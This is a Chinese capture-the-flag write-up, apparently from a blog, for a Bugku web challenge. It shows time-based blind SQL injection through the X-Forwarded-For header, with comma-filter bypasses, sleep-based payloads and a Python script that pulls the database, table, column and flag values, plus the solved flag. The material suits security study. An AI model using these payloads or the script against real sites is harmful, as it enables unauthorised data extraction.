    <content type="html"><![CDATA[<img src="/2019/08/24/insert%20into/1-01.png" srcset="/img/loading.gif" title="image"><p>观察题目</p><img src="/2019/08/24/insert%20into/1-02.png" srcset="/img/loading.gif" title="image"><p>可以看到注入点应该在http头的x-forwarded-for上</p><a id="more"></a><img src="/2019/08/24/insert%20into/1-03.png" srcset="/img/loading.gif" title="image"><p>这里还把‘，’过滤了</p><img src="/2019/08/24/insert%20into/1-04.png" srcset="/img/loading.gif" title="image"><p>因为把，过滤了 if是用不了<br>这里用select case when..then..else..end代替<br>substr也用不了 但是可以用 from 1 for 1代替<br>为了节约时间，可以先手工查字段长度<br>这里以database()做示范:</p><p><strong>x-forwarded-for:1’ and case when(length((select database()))&lt;6) then sleep(3) else 0 end and ‘a</strong></p><img src="/2019/08/24/insert%20into/1-05.png" srcset="/img/loading.gif" title="image"><p>可以看到右下的时间，延时了证明条件成立，最后测出database（）的长度为5，其他数据长度也这样测出来。还是以database()为例，如果单个字符测具体字段：<br><strong>x-forwarded-for:1’ and case when(substr((select database()) from 1 for 1)=’w’) then sleep(3) else 0 end and ‘a</strong></p><img src="/2019/08/24/insert%20into/1-06.png" srcset="/img/loading.gif" title="image"><p>当然转成ascii码用二分法更有效率<br>但为了更加方便 这里写一个脚本</p><pre class=" language-python"><code class="language-python"> !<span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>python<span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span> coding<span class="token punctuation">:</span> UTF<span class="token number">-8</span> <span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> stringmystring <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters<span class="token operator">+</span>string<span class="token punctuation">.</span>digits<span class="token comment" spellcheck="true">#所有字母和数字的集合</span>url<span class="token operator">=</span><span class="token string">'http://123.206.87.240:8002/web15/'</span><span class="token comment" spellcheck="true">#查库名</span>data <span class="token operator">=</span> <span class="token string">"127.0.0.1'+(select case when (substring((database()) from {0} for 1)='{1}') then sleep(5) else 1 end) and '1'='1"</span>  <span class="token comment" spellcheck="true">#这里的{0}对应的是后面所需要的format里的str[i](str应该是database()) 查出来是web15</span><span class="token comment" spellcheck="true">#查表名</span>data <span class="token operator">=</span> <span class="token string">"1'+(case when (substring((select group_concat(table_name) from information_schema.tables where table_schema=database()) from {0} for 1)='{1}') then sleep(4) else 1 end) and '1"</span><span class="token comment" spellcheck="true">#查出来时clineip和flag</span><span class="token comment" spellcheck="true">#查字段名</span>data <span class="token operator">=</span> <span class="token string">"1'+(case when (substring((select group_concat(column_name) from information_schema.columns where table_schema=database() and     table_name='flag') from {0} for 1)='{1}') then sleep(4) else 1 end) and '1"</span><span class="token comment" spellcheck="true">#查出来是 flag</span><span class="token comment" spellcheck="true">#查内容</span>data<span class="token operator">=</span> <span class="token string">"1'+(case when(substring((select flag from flag) from {0} for 1)='{1}') then sleep(4) else 1 end) and '1 "</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#之前得到database()长度为5，但由于substr默认从1开始，所以range设置为1-6 (1,2,3,4,5) 如果不想查把长度设置大一点既可以</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> mystring<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>          headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'x-forwarded-for'</span><span class="token punctuation">:</span>data<span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">#format格式化输出，把查到的str的每一字符依次赋到{0}里去</span>          res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#一旦延时超过3s，继续向下执行代码</span>        <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>ReadTimeout<span class="token punctuation">:</span><span class="token comment" spellcheck="true">#跳到这里执行，得到所求</span>          flag <span class="token operator">+=</span> j          <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>          <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'The final flag:'</span><span class="token operator">+</span>flag<span class="token punctuation">)</span></code></pre><p>由于延时不是很稳定 所以很容易出错 多试几次才能有正确答案flag{cdbf14c9551d5be5612f7bb5d2867853}<br>（最好每次只开一个运行 不然出错概率太大）</p>]]></content>
    
    
    <categories>
      
      <category>ctfweb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>bugku</tag>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
